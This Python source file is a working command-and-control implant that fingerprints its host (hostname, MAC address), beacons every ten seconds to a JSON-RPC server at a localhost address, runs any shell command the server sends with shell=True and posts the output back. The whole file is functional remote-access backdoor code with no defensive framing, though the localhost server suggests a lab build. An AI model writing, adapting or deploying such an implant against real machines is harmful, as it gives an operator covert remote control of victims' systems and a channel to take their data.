import urllib.request
import time
import uuid
import json
import socket
import subprocess

SERVER = "http://127.0.0.1:8000/rpc"
BEACON_INTERVAL = 10

def rpc(method, params=None):
    payload = {
        "jsonrpc": "2.0",
        "method": method,
        "params": params or {},
        "id": str(uuid.uuid4())
    }

    req = urllib.request.Request(
        SERVER,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            if res.status == 204:
                return None
            
            data = json.loads(res.read().decode())

            if "error" in data:
                err = data["error"]
                raise Exception(err["message"] if isinstance(err, dict) else err)
            
            return data.get("result")
        
    except Exception as e:
        print("[RPC ERROR]", e)
        return None

def get_hostname():
    return socket.gethostname()

def get_mac():
    mac = uuid.getnode()
    return ':'.join(f'{(mac >> ele) & 0xff:02x}'
                    for ele in range(40, -1, -8))

def identify():
    return rpc("identify", {
        "hostname": get_hostname(),
        "mac": get_mac(),
    })

def beacon(client_id):
    return rpc("beacon", {
        "client_id": client_id
    })

def shell_handler(params):
    cmd = params.get("cmd")
    if not cmd:
        return {
            "stdout": "",
            "stderr": "no command provided",
            "exit_code": -1           
        }

    result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True
        )

    return {
        "stdout": result.stdout,
        "stderr": result.stderr,
        "exit_code": result.returncode
    }

def execute_task(client_id, task):
    if not task:
        return
    
    task_id = task.get("id")
    method = task.get("method")
    params = task.get("params", {})

    handlers = {
        "shell": shell_handler,
        "print_message": lambda p: {
            "stdout": p.get("message", ""),
            "stderr": "",
            "exit_code": 0
        }
    }

    handler = handlers.get(method)

    if not handler:
        send_result(client_id, task_id, {
            "status": "error",
            "output": {
                "stderr": "method not found",
                "stdout": "",
                "exit_code": -1
            }
        })
        return
    
    try:
        result = handler(params)

        send_result(client_id, task_id, {
            "status": "ok",
            "output": result
        })
    
    except Exception as e:
        send_result(client_id, task_id, {
            "status": "error",
            "output": {
                "stderr": str(e),
                "stdout": "",
                "exit_code": -1
            }
        })

def send_result(client_id, task_id, result):
    rpc("task_result", {
        "client_id": client_id,
        "task_id": task_id,
        "result": result
    })

def main():
    print("[*] loading profile...")

    result = identify()

    if not result:
        print("[-] failed to load profile")
        return
    
    client_id = result.get("client_id")

    if not client_id:
        print("[DEBUG] no client_id received")
        return

    print(f"[+] identified as {client_id}")
    
    while True:
        try:
            time.sleep(BEACON_INTERVAL)

            result = beacon(client_id)
            if not result:
                continue

            execute_task(client_id, result.get("task"))

        except Exception as e:
            print("[LOOP ERROR]", e)

if __name__ == "__main__":
    main()